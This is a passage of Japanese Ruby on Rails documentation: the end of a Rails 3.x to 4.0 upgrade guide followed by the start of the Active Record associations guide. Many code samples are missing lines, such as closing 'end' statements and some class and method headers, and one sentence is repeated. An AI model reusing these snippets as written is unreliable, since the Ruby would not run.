* 動的なメソッドは、`find_by_...`と`find_by_...!`を除いて非推奨となりました。
  以下のように変更してください。
      * `find_all_by_...`           に代えて `where(...)
      * `find_last_by_...`          に代えて `where(...).last` を使用
      * `scoped_by_...`             に代えて `where(...)` を使用
      * `find_or_initialize_by_...` に代えて`find_or_initialize_by(...)`を使用
      * `find_or_create_by_...`   に代えて`find_or_create_by(...)`を使用
* 旧来のfinderが配列を返していたのに対し、`where(...)`はリレーションを返します。
`Array`が必要な場合は, `where(...).to_a`を使用してください。
* これらの同等なメソッドが実行するSQLは、従来の実装と同じではありません。
* 旧来のfinderを再度有効にしたい場合は、[activerecord-deprecated_finders gem](https://github.com/rails/activerecord-deprecated_finders) を使用できます。
### Active Resource
Rails 4.0ではActive Resourceがgem化されました。
この機能が必要な場合は[Active Resource gem](https://github.com/rails/activeresource) をGemfileに追加できます。
### Active Model
* Rails 4.0では`ActiveModel::Validations::ConfirmationValidator`にエラーがアタッチされる方法が変更されました。
確認バリデーションが失敗したときに、`attribute`ではなく`:#{attribute}_confirmation`にアタッチされるようになりました。
* Rails 4.0の`ActiveModel::Serializers::JSON.include_root_in_json`のデフォルト値が`false`に変更されました。
これにより、Active Model SerializersとActive Recordオブジェクトのデフォルトの動作が同じになりました。
これにより、`config/initializers/wrap_parameters.rb`ファイルの以下のオプションをコメントアウトしたり削除したりできるようになりました。
# JSONのルート要素をデフォルトで無効にする
# ActiveSupport.on_load(:active_record) do
  self.include_root_in_json = false
# end
### Action Pack
* Rails 4.0から`ActiveSupport::KeyGenerator`が導入され、署名付きcookiesの生成と照合などに使用されるようになりました。
Rails 3.xで生成された既存の署名付きcookiesは、既存の`secret_token`はそのままにして`secret_key_base`を新しく追加することで透過的にアップグレードされます。
  # config/initializers/secret_token.rb
  Myapp::Application.config.secret_token = 'existing secret token'
  Myapp::Application.config.secret_key_base = 'new secret key base'
注意：`secret_key_base`を設定するのは、Rails 4.xへのユーザーベースの移行が100%完了し、Rails 3.xにロールバックする必要が完全になくなってからにしてください。
これは、Rails 4.xの新しい`secret_key_base`を使用して署名されたcookiesにはRails 3.xのcookiesとの後方互換性がないためです。
他のアップグレードが完全に完了するまでは、既存の`secret_token`をそのままにして`secret_key_base`を設定せず、非推奨警告を無視するという選択肢もあります。
外部アプリケーションやJavaScriptからRailsアプリケーションの署名付きセッションcookies (または一般の署名付きcookies) を読み出せる必要がある場合は、これらの問題を切り離すまでは`secret_key_base`を設定しないでください。
* Rails 4.0では、`secret_key_base`が設定されているとcookieベースのセッションの内容が暗号化されます。
Rails 3.xではcookieベースのセッションへの署名は行われますが暗号化は行われません。
署名付きcookiesは、そのRailsアプリケーションで生成されたことが確認でき、不正が防止されるという意味では安全です。
しかしセッションの内容はエンドユーザーから見えてしまいます。内容を暗号化することで懸念を取り除くことができ、パフォーマンスの低下もそれほどありません。
セッションcookiesを暗号化する方法の詳細については[Pull Request #9978](https://github.com/rails/rails/pull/9978) を参照してください。
* Rails 4.0 では`ActionController::Base.asset_path`オプションが廃止されました。
代りにアセットパイプライン機能をご利用ください。
* Rails 4.0では`ActionController::Base.page_cache_extension`オプションが非推奨になりました。
代りに`ActionController::Base.default_static_extension`をご利用ください。
* Rails 4.0のAction PackからActionとPageのキャッシュ機能が取り除かれました。
コントローラで`caches_action`を使用したい場合は`actionpack-action_caching` gemを、`caches_pages`を使用したい場合は`actionpack-page_caching` gemをそれぞれGemfileに追加する必要があります。
* Rails 4.0からXMLパラメータパーサーが取り除かれました。
この機能が必要な場合は`actionpack-xml_parser` gemを追加する必要があります。
* Rails 4.0のデフォルトのmemcachedクライアントが`memcache-client`から`dalli`に変更されました。
アップグレードするには、単に`gem 'dalli'`を`Gemfile`に追加します。
* Rails 4.0ではコントローラでの`dom_id`および`dom_class`メソッドの使用が非推奨になりました (ビューでの使用は問題ありません)。
この機能が必要なコントローラでは`ActionView::RecordIdentifier`モジュールをインクルードする必要があります。
* Rails 4.0では`link_to`ヘルパーでの`:confirm`オプションが非推奨になりました。
代りにデータ属性を使用してください (例： `data: { confirm: 'Are you sure?' }`)。
`link_to_if`や`link_to_unless`などでも同様の対応が必要です。
* Rails 4.0では`assert_generates`、`assert_recognizes`、`assert_routing`の動作が変更されました。
これらのアサーションからは`ActionController::RoutingError`の代りに`Assertion`が発生するようになりました。
* Rails 4.0では、名前付きルートの定義が重複している場合に`ArgumentError`が発生するようになりました。
このエラーは、明示的に定義された名前付きルートや`resources`メソッドによってトリガされます。
名前付きルート`example_path`が衝突している例を2つ示します。
  get 'one' => 'test#example', as: :example
  get 'two' => 'test#example', as: :example
  resources :examples
最初の例では、複数のルーティングで同じ名前を使用しないようにすれば回避できます。
* Rails 4.0ではunicode文字のルーティングの描出方法が変更されました。
unicode文字を使用するルーティングを直接描出できるようになりました。
既にこのようなルーティングを使用している場合は、以下の変更が必要です。
get Rack::Utils.escape('こんにちは'), controller: 'welcome', action: 'index'
上のコードは以下のように変更する必要があります。
get 'こんにちは', controller: 'welcome', action: 'index'
* Rails 4.0でルーティングに`match`を使用する場合は、リクエストメソッドの指定が必須となりました。
  # Rails 3.x
  match '/' => 'root#index'
上のコードは以下のように変更する必要があります。
  match '/' => 'root#index', via: :get
  # または
  get '/' => 'root#index'
* Rails 4.0から`ActionDispatch::BestStandardsSupport`ミドルウェアが削除されました。`<!DOCTYPE html>`は既に http://msdn.microsoft.com/en-us/library/jj676915(v=vs.85).aspx の標準モードをトリガするようになり、ChromeFrameヘッダは`config.action_dispatch.default_headers`に移動されました。
アプリケーションコード内にあるこのミドルウェアへの参照はすべて削除する必要がありますので注意が必要です。例：
# 例外発生
config.middleware.insert_before(Rack::Lock, ActionDispatch::BestStandardsSupport)
環境設定も確認し、`config.action_dispatch.best_standards_support`がある場合は削除します。
* Rails 4.0のアセットのプリコンパイルでは、`vendor/assets`および`lib/assets`にある非JS/CSSアセットを自動的にはコピーしなくなりました。
Railsアプリケーションとエンジンの開発者は、これらのアセットを手動で`app/assets`に置き、`config.assets.precompile`を設定してください。
* Rails 4.0では、リクエストされたフォーマットがアクションで扱えなかった場合に`ActionController::UnknownFormat`が発生するようになりました。
デフォルトでは、この例外は406 Not Acceptable応答として扱われますが、この動作をオーバーライドすることができます。
Rails 3では常に406 Not Acceptableが返されます。
オーバーライドはできません。
* Rails 4.0では、`ParamsParser`がリクエストパラメータをパースできなかった場合に一般的な`ActionDispatch::ParamsParser::ParseError`例外が発生するようになりました。
`MultiJson::DecodeError`のような低レベルの例外の代りにこの例外をレスキューすることができます。
* Rails 4.0では、URLプレフィックスで指定されたアプリケーションにエンジンがマウントされている場合に`SCRIPT_NAME`が正しく入れ子になるようになりました。
今後はURLプレフィックスの上書きを回避するために`default_url_options[:script_name]`を設定する必要はありません。
* Rails 4.0では`ActionDispatch::Integration`の導入に伴い`ActionController::Integration`が非推奨となりました。
* Rails 4.0では`ActionDispatch::IntegrationTest`の導入に伴い`ActionController::IntegrationTest`は非推奨となりました。
* Rails 4.0では`ActionDispatch::PerformanceTest`の導入に伴い`ActionController::PerformanceTest`が非推奨となりました。
* Rails 4.0では`ActionDispatch::Request`の導入に伴い`ActionController::AbstractRequest`が非推奨となりました。
* Rails 4.0では`ActionDispatch::Request`の導入に伴い`ActionController::Request`が非推奨となりました。
* Rails 4.0では`ActionDispatch::Response`の導入に伴い`ActionController::AbstractResponse`が非推奨となりました。
* Rails 4.0では`ActionDispatch::Response`の導入に伴い`ActionController::Response`が非推奨となりました。
* Rails 4.0では`ActionDispatch::Routing`の導入に伴い`ActionController::Routing`が非推奨となりました。
### Active Support
Rails 4.0では`ERB::Util#json_escape`のエイリアス`j`が廃止されました。このエイリアス`j`は既に`ActionView::Helpers::JavaScriptHelper#escape_javascript`で使用されているためです。
### ヘルパーの読み込み順序
Rails 4.0では複数のディレクトリからのヘルパーの読み込み順が変更されました。
以前はすべてのヘルパーをいったん集めてからアルファベット順にソートしていました。
Rails 4.0にアップグレードすると、ヘルパーは読み込まれたディレクトリの順序を保持し、ソートは各ディレクトリ内でのみ行われます。
`helpers_path`パラメータを明示的に使用している場合を除いて、この変更はエンジンからヘルパーを読み込む方法にしか影響しません。
ヘルパー読み込みの順序に依存している場合は、アップグレード後に正しいメソッドが使用できているかどうかを確認する必要があります。
エンジンが読み込まれる順序を変更したい場合は、`config.railties_order=` メソッドを使用できます。
### Active Record ObserverとAction Controller Sweeper
`Active Record Observer`と`Action Controller Sweeper`は`rails-observers` gemに切り出されました。
これらの機能が必要な場合は`rails-observers` gemを追加してください。
### sprockets-rails
* `assets:precompile:primary`および`assets:precompile:all`は削除されました。
`assets:precompile`を代りに使用してください。
* `config.assets.compress`オプションは、たとえば以下のように`config.assets.js_compressor` に変更する必要があります。
config.assets.js_compressor = :uglifier
### sass-rails
* 引数を2つ使用する`asset-url`は非推奨となりました。
たとえば、`asset-url("rails.png", image)`は`asset-url("rails.png")`とする必要があります。
Rails 3.1からRails 3.2へのアップグレード
Railsアプリケーションのバージョンが3.1より前の場合、まず3.1へのアップグレードを完了してからRails 3.2へのアップグレードにとりかかってください。
Railsアプリケーションのバージョンが3.1よりも古い場合、まず3.1へのアップグレードを完了してからRails 3.2へのアップグレードを開始してください。
`Gemfile`を以下のように変更します。
group :assets do
  gem 'sass-rails',   '~> 3.2.6'
  gem 'coffee-rails', '~> 3.2.2'
  gem 'uglifier',     '>= 1.0.3'
### config/environments/development.rb
development環境にいくつかの新しい設定を追加する必要があります。
# Active Recordのモデルをマスアサインメントから保護するために例外を発生する
config.active_record.mass_assignment_sanitizer = :strict
# クエリの実行計画 (クエリプラン) を現在より多く出力する
# (SQLite、MySQL、PostgreSQLで動作)
config.active_record.auto_explain_threshold_in_seconds = 0.5
### config/environments/test.rb
`mass_assignment_sanitizer`設定を`config/environments/test.rb`にも追加する必要があります。
`vendor/plugins` はRails 3.2で非推奨となり、Rails 4.0では完全に削除されました。
Rails 3.2へのアップグレードでは必須ではありませんが、今のうちにプラグインをgemにエクスポートしてGemfileに追加するのがよいでしょう。
`:dependent => :restrict`オプションは`belongs_to`から削除されました。
関連付けられたオブジェクトがある場合にこのオブジェクトを削除したくない場合は、`:dependent => :destroy`を設定し、関連付けられたオブジェクトのdestroyコールバックとの関連付けがあるかどうかを確認してから`false`を返すようにします。
Rails 3.0からRails 3.1へのアップグレード
Railsアプリケーションのバージョンが3.0より前の場合、まず3.0へのアップグレードを完了してからRails 3.1へのアップグレードにとりかかってください。
以下の変更は、Rails 3.1.xの最新版であるRails 3.1.12にアップグレードするためのものです。
gem 'rails', '3.1.12'
gem 'mysql2' 
# 新しいアセットパイプラインで必要
  gem 'sass-rails',   '~> 3.1.7'
  gem 'coffee-rails', '~> 3.1.1'
# Rails 3.1からjQueryがデフォルトのJavaScriptライブラリになる
gem 'jquery-rails'
### config/application.rb
アセットパイプラインを使用するために以下の変更が必要です。
config.assets.enabled = true
config.assets.version = '1.0'
Railsアプリケーションでリソースのルーティングに"/assets"ルートを使用している場合、コンフリクトを避けるために以下の変更を加えます。
# '/assets'のデフォルト
config.assets.prefix = '/asset-files'
RJS の設定`config.action_view.debug_rjs = true`を削除してください。
アセットパイプラインを有効にしている場合は以下の設定を追加します。
# 開発環境ではアセットを圧縮しない
config.assets.compress = false
# アセットで読み込んだ行を展開する
config.assets.debug = true
### config/environments/production.rb
以下の変更はほとんどがアセットパイプライン用です。
詳細については [アセットパイプライン](asset_pipeline.html) ガイドを参照してください。
# JavaScriptとCSSを圧縮する
config.assets.compress = true
# プリコンパイル済みのアセットが見当たらない場合にアセットパイプラインにフォールバックしない
config.assets.compile = false
# アセットURLのダイジェストを生成する
config.assets.digest = true
# Rails.root.join("public/assets")へのデフォルト
# config.assets.manifest = 該当するパス
# 追加のアセット (application.js、application.cssおよびすべての非JS/CSSが追加済み) をプリコンパイルする
# config.assets.precompile += %w( search.js )
# アプリケーションへのすべてのアクセスを強制的にSSLにし、Strict-Transport-Securityとセキュアクッキーを使用する
# config.force_ssl = true
テスト環境に以下を追加することでテストのパフォーマンスが向上します。
# Cache-Controlを使用するテストで静的アセットサーバーを構成し、パフォーマンスを向上させる
config.static_cache_control = 'public, max-age=3600'
### config/initializers/wrap_parameters.rb
ネストしたハッシュにパラメータを含めたい場合は、このファイルに以下のコンテンツを含めて追加します。
新しいアプリケーションではこれがデフォルトになります。
# このファイルを変更後サーバーを必ず再起動してください。
# このファイルにはActionController::ParamsWrapper用の設定が含まれており
# デフォルトでオンになっています。
# JSON用にパラメータをラップします。:formatに空配列を設定することで無効にできます。
ActiveSupport.on_load(:action_controller) do
  wrap_parameters format: [:json]
ActiveSupport.on_load(:active_record) do
  self.include_root_in_json = false
### config/initializers/session_store.rb
何らかの新しいセッションキーを設定するか、すべてのセッションを削除するかのどちらかにする必要があります。
# config/initializers/session_store.rbに以下を設定する
AppName::Application.config.session_store :cookie_store, key: 'SOMETHINGNEW'
$ bin/rake db:sessions:clear
### ビューのアセットヘルパー参照から:cacheオプションと:concatオプションを削除する
* Asset Pipelineの:cacheオプションと:concatは廃止されました。ビューからこれらのオプションを削除してください。
Active Record の関連付け (アソシエーション)
このガイドでは、Active Recordの関連付け機能(アソシエーション)について解説します。
* Active Recordのモデル同士の関連付けを宣言する方法
* Active Recordのモデルを関連付けるさまざまな方法
* 関連付けを作成すると自動的に追加されるメソッドの使用方法
関連付けを使用する理由
モデルとモデルの間には関連付けを行なう必要がありますが、その理由を御存じでしょうか。
関連付けを行なうのは、それによってコード内で一般的に行われる操作をはるかに簡単にできるからです。
簡単なRailsアプリケーションを例にとって説明しましょう。このアプリケーションには顧客用のモデル(Customer)と注文用のモデル(Order)があります。
一人の顧客は、多くの注文を行なうことができます。
関連付けを設定していない状態では、モデルの宣言は以下のようになります。
class Customer < ActiveRecord::Base
ここで、既存の顧客のために新しい注文を1つ追加したくなったとします。
この場合、以下のようなコードを実行する必要があるでしょう。
@order = Order.create(order_date: Time.now, customer_id: @customer.id)
今度は顧客を削除する場合を考えてみましょう。顧客を削除するなら、以下のように、顧客の注文も残らず削除されるようにしておかなければなりません。
@orders = Order.where(customer_id: @customer.id)
@orders.each do |order|
  order.destroy
@customer.destroy
Active Recordの関連付け機能を使用すると、2つのモデルの間につながりがあることを明示的にRailsに対して宣言することができ、それによってモデルの操作を一貫させることができます。
顧客と注文を設定するコードを次のように書き直します。
  has_many :orders, dependent: :destroy
  belongs_to :customer
上のように関連付けを追加したことで、特定の顧客用に新しい注文を1つ作成する作業が以下のように一行でできるようになりました。
@order = @customer.orders.create(order_date: Time.now)
顧客と、顧客の注文をまとめて削除する作業はさらに簡単です。
その他の関連付け方法については、次の節をお読みください。
それに続いて、関連付けに関するさまざまなヒントや活用方法、Railsの関連付けメソッドとオプションの完全な参照物もご紹介します。
関連付けの種類
Railsでは、「関連付け(アソシエーション: association)」とは2つのActive Recordモデル同士のつながりを指します。
関連付けは、一種のマクロ的な呼び出しとして実装されており、これによってモデル間の関連付けを宣言的に追加することができます。
たとえば、あるモデルが他のモデルに従属している(`belongs_to`)と宣言すると、2つのモデルのそれぞれのインスタンス間で「主キー - 外部キー」情報を保持しておくようにRailsに指示が伝わります。
Railsでサポートされている関連付けは以下の6種類です。
* `belongs_to`
* `has_one`
* `has_many`
* `has_many :through`
* `has_one :through`
* `has_and_belongs_to_many`
本ガイドではこの後、それぞれの関連付けの宣言方法と使用方法について詳しく解説します。
その前に、それぞれの関連付けが適切となる状況について簡単にご紹介しましょう。
### `belongs_to`関連付け
あるモデルで`belongs_to`関連付けを行なうと、他方のモデルとの間に「1対1」のつながりが設定されます。このとき、宣言を行ったモデルのすべてのインスタンスは、他方のモデルのインスタンスに「従属(belongs to)」します。
たとえば、Railsアプリケーションに顧客(customer)と注文(order)情報が含まれており、1つの注文につき正確に1人の顧客だけを割り当てたいのであれば、Orderモデルで以下のように宣言します。
belongs_to 関連付けの図](images/belongs_to.png)
NOTE: `belongs_to`関連付けで指定するモデル名は必ず「単数形」にしなければなりません。
上の場合、`Order`モデルにおける関連付けの`customer`を複数形の`customers`にしてしまうと、"uninitialized constant Order::Customers" エラーが発生します。
Railsは、関連付けの名前から自動的にモデルのクラス名を推測します。関連付け名が`customer`ならクラス名を`Customer`と推測します。
従って、関連付け名が誤って複数形になってしまっていると、そこから推測されるクラス名も誤って複数形になってしまいます。
上の関連付けに対応するマイグレーションは以下のような感じになります。
class CreateOrders < ActiveRecord::Migration
    create_table :customers do |t| 
      t.string :name
    create_table :orders do |t|
      t.belongs_to :customer
      t.datetime :order_date
### `has_one`関連付け
`has_one`関連付けも、他方のモデルとの間に1対1の関連付けを設定します。しかし、その意味と結果は`belongs_to`とは若干異なります。
`has_one`関連付けの場合は、その宣言が行われているモデルのインスタンスが、他方のモデルのインスタンスを「まるごと含んでいる」または「所有している」ことを示します。
たとえば、供給者(supplier)1人につきアカウント(account)を1つだけ持つという関係があるのであれば、以下のように宣言を行います。
class Supplier < ActiveRecord::Base
  has_one :account
has_one関連付けの図](images/has_one.png)
class CreateSuppliers < ActiveRecord::Migration
    create_table :suppliers do |t|
    create_table :accounts do |t|
      t.belongs_to :supplier
      t.string :account_number
### `has_many`関連付け
`has_many`関連付けは、他のモデルとの間に「1対多」のつながりがあることを示します。
`has_many`関連付けが使用されている場合、「反対側」のモデルでは`belongs_to`が使用されることが多くあります。
`has_many`関連付けが使用されている場合、そのモデルのインスタンスは、反対側のモデルの「0個以上の」インスタンスを所有します。
たとえば、顧客(customer)と注文(order)を含むRailsアプリケーションでは、顧客のモデルを以下のように宣言することができます。
NOTE: `has_many`関連付けを宣言する場合、相手のモデル名は「複数形」にする必要があります。
has_many関連付けの図](images/has_many.png)
class CreateCustomers < ActiveRecord::Migration
### `has_many :through`関連付け
`has_many :through`関連付けは、他方のモデルと「多対多」のつながりを設定する場合によく使われます。
この関連付けは、2つのモデルの間に「第3のモデル」(結合モデル)が介在する点が特徴です。それによって、相手モデルの「0個以上」のインスタンスとマッチします。
たとえば、患者(patient)が医師(physician)との診察予約(appointment)を取る医療業務を考えてみます。
この場合、関連付けは次のような感じになるでしょう。
class Physician < ActiveRecord::Base
  has_many :appointments
  has_many :patients, through: :appointments
class Appointment < ActiveRecord::Base
  belongs_to :physician
  belongs_to :patient
class Patient < ActiveRecord::Base 
  has_many :physicians, through: :appointments
has_many :through関連付けの図](images/has_many_through.png)
class CreateAppointments < ActiveRecord::Migration
    create_table :physicians do |t|
    create_table :patients do |t|
    create_table :appointments do |t|
      t.belongs_to :physician
      t.belongs_to :patient
      t.datetime :appointment_date
結合モデル(join model)のコレクションは、API経由で管理できます。たとえば、以下のような割り当てを実行したとします。
physician.patients = patients
このとき、新たに関連付けられたオブジェクトについて、新しい結合モデルが作成されます。結合時に不足している部分があれば、その行は結合モデルから削除され、結合モデルに含まれなくなります。
WARNING: モデル結合時の不足分自動削除は即座に行われます。さらに、その際にdestroyコールバックはトリガーされませんので注意が必要です。
`has_many :through`関連付けは、ネストした`has_many`関連付けを介して「ショートカット」を設定する場合にも便利です。
たとえば、1つのドキュメントに多くの節(section)があり、1つの節の下に多くの段落(paragraph)がある状態で、節をスキップしてドキュメントの下のすべての段落の単純なコレクションが欲しいとします。
その場合、以下の方法で設定できます。
class Document < ActiveRecord::Base
  has_many :sections
  has_many :paragraphs, through: :sections
class Section < ActiveRecord::Base
  belongs_to :document
  has_many :paragraphs
class Paragraph < ActiveRecord::Base
  belongs_to :section
`through: :sections`と指定することにより、Railsは以下の文を理解できるようになります。
@document.paragraphs
### `has_one :through`関連付け
`has_one :through`関連付けは、他のモデルとの間に1対1のつながりを設定します。
この関連付けは、2つのモデルの間に「第3のモデル」(結合モデル)が介在する点が特徴です。それによって、相手モデルの1つのインスタンスとマッチします。
たとえば、1人の提供者(supplier)が1つのアカウントに関連付けられ、さらに1つのアカウントが1つのアカウント履歴に関連付けられる場合、supplierモデルは以下のような感じになります。
  has_one :account_history, through: :account
  belongs_to :supplier
  has_one :account_history
class AccountHistory < ActiveRecord::Base
  belongs_to :account
has_one :through関連付けの図](images/has_one_through.png)
class CreateAccountHistories < ActiveRecord::Migration
    create_table :account_histories do |t|
      t.belongs_to :account
      t.integer :credit_rating
### `has_and_belongs_to_many`関連付け
`has_and_belongs_to_many`関連付けは、他方のモデルと「多対多」のつながりを作成しますが、`through:`を指定した場合と異なり、第3のモデル(結合モデル)が介在しません(訳注: 後述するように結合用のテーブルは必要です)。
たとえば、アプリケーションに完成品(assembly)と部品(part)があり、1つの完成品に多数の部品が対応し、逆に1つの部品にも多くの完成品が対応するのであれば、モデルの宣言は以下のようになります。
class Assembly < ActiveRecord::Base
  has_and_belongs_to_many :parts
class Part < ActiveRecord::Base
  has_and_belongs_to_many :assemblies
has_and_belongs_to_many関連付けの図](images/habtm.png)
class CreateAssembliesAndParts < ActiveRecord::Migration
    create_table :assemblies do |t|
    create_table :parts do |t|
      t.string :part_number
    create_table :assemblies_parts, id: false do |t|
      t.belongs_to :assembly
      t.belongs_to :part
### `belongs_to`と`has_one`のどちらを選ぶか
2つのモデルの間に1対1の関係を作りたいのであれば、いずれか一方のモデルに`belongs_to`を追加し、もう一方のモデルに`has_one`を追加する必要があります。
どちらの関連付けをどちらのモデルに置けばよいのでしょうか。
区別の決め手となるのは外部キー(foreign key)をどちらに置くかです(外部キーは、`belongs_to`を追加した方のモデルのテーブルに追加されます)。もちろんこれだけでは決められません。データの実際の意味についてもう少し考えてみる必要があります。
`has_one`というリレーションは、主語となるものが目的語となるものを「所有している」ということを表しています。そして、所有されている側(目的語)の方が、所有している側(主語)を指し示しているということも表しています。
たとえば、「供給者がアカウントを持っている」とみなす方が、「アカウントが供給者を持っている」と考えるよりも自然です。
つまり、この場合の正しい関係は以下のようになります。
      t.string :name
      t.integer :supplier_id
      t.string  :account_number
NOTE: マイグレーションで`t.integer :supplier_id`のように「小文字のモデル名_id」と書くと、外部キーを明示的に指定できます。
新しいバージョンのRailsでは、同じことを`t.references :supplier`という方法で記述できます。こちらの方が実装の詳細が抽象化され、隠蔽されます。
### `has_many :through`と`has_and_belongs_to_many`のどちらを選ぶか
Railsでは、モデル間の多対多リレーションシップを宣言するのに2とおりの方法が使用できます。
簡単なのは`has_and_belongs_to_many`を使用する方法です。この方法では関連付けを直接指定できます。
多対多のリレーションシップを宣言するもう1つの方法は`has_many :through`です。
こちらの場合は、結合モデルを使用した間接的な関連付けが使用されます。
  has_many :manifests
  has_many :parts, through: :manifests
class Manifest < ActiveRecord::Base
  belongs_to :assembly
  belongs_to :part
  has_many :assemblies, through: :manifests
どちらを使用するかについてですが、経験上、リレーションシップのモデルそれ自体を独立したエンティティとして扱いたい(両モデルの関係そのものについて処理を行いたい)のであれば、中間に結合モデルを使用する`has_many :through`リレーションシップを選ぶのが最もシンプルです。
リレーションシップのモデルで何か特別なことをする必要がまったくないのであれば、結合モデルの不要な`has_and_belongs_to_many`リレーションシップを使用するのがシンプルです(ただし、こちらの場合は結合モデルが不要な代わりに、専用の結合テーブルを別途データベースに作成しておく必要がありますので、お忘れなきよう)。
結合モデルで検証(validation)、コールバック、追加の属性が必要なのであれば、`has_many :through`を使用しましょう。
### ポリモーフィック関連付け
_ポリモーフィック関連付け_は、関連付けのやや高度な応用です。
ポリモーフィック関連付けを使用すると、ある1つのモデルが他の複数のモデルに属していることを、1つの関連付けだけで表現することができます。
たとえば、写真(picture)モデルがあり、このモデルを従業員(employee)モデルと製品(product)モデルの両方に従属させたいとします。
この場合は以下のように宣言します。
class Picture < ActiveRecord::Base
  belongs_to :imageable, polymorphic: true
class Employee < ActiveRecord::Base
  has_many :pictures, as: :imageable
ポリモーフィックな`belongs_to`は、他のあらゆるモデルから使用できる、(デザインパターンで言うところの)インターフェイスを設定する宣言とみなすこともできます。
`@employee.pictures`とすると、写真のコレクションを`Employee`モデルのインスタンスから取得できます。
同様に、`@product.pictures`とすれば写真のコレクションを`Product`モデルのインスタンスから取得できます。
`Picture`モデルのインスタンスがあれば、`@picture.imageable`とすることで親を取得できます。
これができるようにするためには、ポリモーフィックなインターフェイスを使用するモデルで、外部キーのカラムと型のカラムを両方とも宣言しておく必要があります。
class CreatePictures < ActiveRecord::Migration
    create_table :pictures do |t|
      t.string  :name
      t.integer :imageable_id
      t.string  :imageable_type
`t.references`という書式を使用するとさらにシンプルにできます。
      t.string  :name
      t.references :imageable, polymorphic: true
ポリモーフィック関連付けの図](images/polymorphic.png)
### 自己結合
データモデルを設計していると、時に自分自身に関連付けられる必要のあるモデルに出会うことがあります。
たとえば、1つのデータベースモデルに全従業員を格納しておきたいが、マネージャーと部下(subordinate)の関係も追えるようにしておきたい場合が考えられます。
この状況は、自己結合関連付けを使用してモデル化することができます。
  has_many :subordinates, class_name: "Employee",
                          foreign_key: "manager_id"
  belongs_to :manager, class_name: "Employee"
上のように宣言しておくと、`@employee.subordinates`と`@employee.manager`が使用できるようになります。
マイグレーションおよびスキーマでは、モデル自身にreferencesカラムを追加します。
class CreateEmployees < ActiveRecord::Migration
    create_table :employees do |t|
      t.references :manager
ヒントと注意事項
RailsアプリケーションでActive Recordの関連付けを効率的に使用するためには、以下について知っておく必要があります。
* キャッシュ制御
* 名前衝突の回避
* スキーマの更新
* 関連付けのスコープ制御
* 双方向関連付け
### キャッシュ制御
関連付けのメソッドは、すべてキャッシュを中心に構築されています。最後に実行したクエリの結果はキャッシュに保持され、次回以降の操作で使用できます。
このキャッシュはメソッド間でも共有されることに注意してください。
customer.orders                 # データベースからordersを取得する
customer.orders.size            # ordersのキャッシュコピーが使用される
customer.orders.empty?          
# ordersのキャッシュコピーが使用される
データがアプリケーションの他の部分によって更新されている可能性に対応するために、キャッシュを再読み込みするにはどうしたらよいでしょうか。
その場合は関連付けのメソッド呼び出しで`true`を指定するだけで、キャッシュが破棄されてデータが再読み込みされます。
customer.orders(true).empty?    
# ordersのキャッシュコピーが破棄される
                                # その後データベースから再度読み込まれる
### 名前衝突の回避
関連付けにはどんな名前でも使用できるとは限りません。
関連付けを作成すると、モデルにその名前のメソッドが追加されます。従って、`ActiveRecord::Base`のインスタンスで既に使用されているような名前を関連付けに使用するのは禁物です。
そのような名前を関連付けに使用すると、基底メソッドが上書きされて不具合が生じる可能性があります。
`attributes`や`connection`は関連付けに使ってはならない名前の例です。
### スキーマの更新
関連付けはきわめて便利ですが、残念ながら全自動の魔法ではありません。
関連付けを使用するからには、関連付けの設定に合わせてデータベースのスキーマを常に更新しておく責任が生じます。
作成した関連付けにもよりますが、具体的には次の2つの作業が必要になります。
1. `belongs_to`関連付けを使用する場合は、外部キーを作成する必要があります。2. `has_and_belongs_to_many`関連付けを使用する場合は、適切な結合テーブルを作成する必要があります。
#### `belongs_to`関連付けに対応する外部キーを作成する
`belongs_to`関連付けを宣言したら、対応する外部キーを作成する必要があります。
以下のモデルを例にとります。
上の宣言は、以下のようにordersテーブル上の外部キー宣言によって裏付けられている必要があります。
      t.string   :order_number
      t.integer  :customer_id
モデルを先に作り、しばらく経過してから関連を追加で設定する場合は、`add_column`マイグレーションを作成して、必要な外部キーをモデルのテーブルに追加するのを忘れないようにしてください。
#### `has_and_belongs_to_many`関連付けに対応する結合テーブルを作成する
`has_and_belongs_to_many`関連付けを作成した場合は、それに対応する結合(join)テーブルを明示的に作成する必要があります。
`:join_table`オプションを使用して明示的に結合テーブルの名前が指定されていない場合、Active Recordは2つのクラス名を辞書の並び順に連結して、適当に結合テーブル名をこしらえます。
たとえばCustomerモデルOrderモデルを連結する場合、cはoより辞書で先に出現するので "customers_orders" というデフォルトの結合テーブル名が使用されます。
WARNING: モデル名の並び順は`String`クラスの`<`演算子を使用して計算されます。
これは、2つの文字列の長さが異なり、短い方が長い方の途中まで完全に一致しているような場合、長い方の文字列は短い方よりも辞書上の並び順が前として扱われるということです。
生成された名前がどのようなものであれ、適切なマイグレーションを実行して結合テーブルを生成する必要があります。
以下の関連付けを例にとって考えてみましょう。
この関連付けに対応する `assemblies_parts` テーブルをマイグレーションで作成し、裏付けておく必要があります。
このテーブルには主キーを設定しないでください。
class CreateAssembliesPartsJoinTable < ActiveRecord::Migration
      t.integer :assembly_id
      t.integer :part_id
このテーブルはモデルを表さないので、`create_table`に`id: false`を渡します。
こうしておかないとこの関連付けは正常に動作しません。
モデルのIDが破損する、IDの競合で例外が発生するなど、`has_and_belongs_to_many`関連付けの動作が怪しい場合は、この設定を忘れていないかどうか再度確認してみてください。
### 関連付けのスコープ制御
デフォルトでは、関連付けによって探索されるオブジェクトは、現在のモジュールのスコープ内のものだけです。
Active Recordモデルをモジュール内で宣言している場合、この点に注意する必要があります。
module MyApplication
  module Business
    class Supplier < ActiveRecord::Base
       has_one :account
    class Account < ActiveRecord::Base
       belongs_to :supplier
上のコードは正常に動作します。これは、`Supplier`クラスと`Account`クラスが同じスコープ内で定義されているためです。
しかし下のコードは動作しません。`Supplier`クラスと`Account`クラスが異なるスコープ内で定義されているためです。
  module Billing
あるモデルと異なる名前空間にあるモデルを関連付けるには、関連付けの宣言で完全なクラス名を指定する必要があります
       has_one :account,
        class_name: "MyApplication::Billing::Account"
       belongs_to :supplier,
        class_name: "MyApplication::Business::Supplier"
### 双方向関連付け
関連付けは、通常双方向で設定します。2つのモデル両方に関連を定義する必要があります。
Active Recordは、これらの双方向関連付け同士につながりがあることをデフォルトでは認識しません。
これにより、以下のようにオブジェクトの2つのコピー同士で内容が一致しなくなることがあります。
c = Customer.first
o = c.orders.first
c.first_name == o.customer.first_name # => true
c.first_name = 'Manny'
c.first_name == o.customer.first_name # => false
これが起こるのは、cとo.customerは同じデータがメモリ上で異なる表現となっており、一方が更新されても他方が自動的には更新されないためです。
Active Recordの`:inverse_of`オプションを使用すればこれらの関係を通知することができます。
  has_many :orders, inverse_of: :customer
